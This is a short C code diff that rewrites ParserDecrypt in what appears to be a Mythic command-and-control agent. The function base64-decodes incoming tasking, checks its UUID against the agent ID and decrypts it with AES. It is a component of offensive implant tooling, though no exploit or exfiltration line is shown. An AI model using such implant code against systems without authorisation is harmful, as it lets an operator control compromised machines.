@@ -237,37 +237,48 @@ cleanup:
 }
 
 
-// BOOL ParserDecrypt(PPARSER parser)
-// {
-//     _dbg("Decrypting package of %d bytes", parser->Length);
 
-//     if (!ParserBase64Decode(parser)) {
-//         _err("Base64 decoding failed");
-//         return FALSE;
-//     }
+/**
+ * @brief Decode & Decrypt a message returning a parser
+ * 
+ * @return OUT parser
+ */
+BOOL ParserDecrypt(_Inout_ PPARSER parser)
+{
+    PCHAR  MsgUuid  = NULL;
+    SIZE_T IdLen    = TASK_UUID_SIZE;
 
-//     // Check payload UUID
-//     SIZE_T sizeUuid             = TASK_UUID_SIZE;
-//     PCHAR receivedPayloadUUID   = NULL; 
-//     receivedPayloadUUID         = ParserGetString(parser, &sizeUuid);
-//     // Use memcmp to pass a strict size of bytes to compare
-//     if (memcmp(receivedPayloadUUID, xenonConfig->agentID, TASK_UUID_SIZE) != 0) {
-//         _err("Check-in payload UUID doesn't match what we have. Expected - %s : Received - %s", xenonConfig->agentID, receivedPayloadUUID);
-//         return FALSE;
-//     }
-        
-//     // Mythic AES decryption
-//     if (xenonConfig->isEncryption)
-//     {
-//         if (!CryptoMythicDecryptParser(parser))
-//             return FALSE;
-//     }
+    if ( parser->Buffer == NULL || parser->Length == 0 )
+        return FALSE;
 
-//     _dbg("Decrypted Response");
-//     print_bytes(parser->Buffer, parser->Length);
 
-//     return TRUE;
-// }
+    if ( !ParserBase64Decode(parser) ) 
+    {
+        _err("Failed to base64 decode buffer");
+        return FALSE;
+    }
+
+    /* Validate Mythic UUID against Agent */
+    MsgUuid = ParserGetString(parser, &IdLen);
+
+    if ( memcmp(MsgUuid, xenonConfig->agentID, TASK_UUID_SIZE) != 0 ) 
+    {
+        _err("Msg UUID does NOT match current Agent ID. \n\t Expected - %s : \n\t Received - %s", xenonConfig->agentID, MsgUuid);
+        return FALSE;
+    }
+    
+
+    if ( xenonConfig->isEncryption )
+    {
+        if ( !CryptoMythicDecryptParser(parser) )
+        {
+            _err("Failed to decrypt buffer.");
+            return FALSE;
+        }
+    }
+
+    return TRUE;
+}
 
 // Frees the data held in the parser
 VOID ParserDestroy(PPARSER parser) 
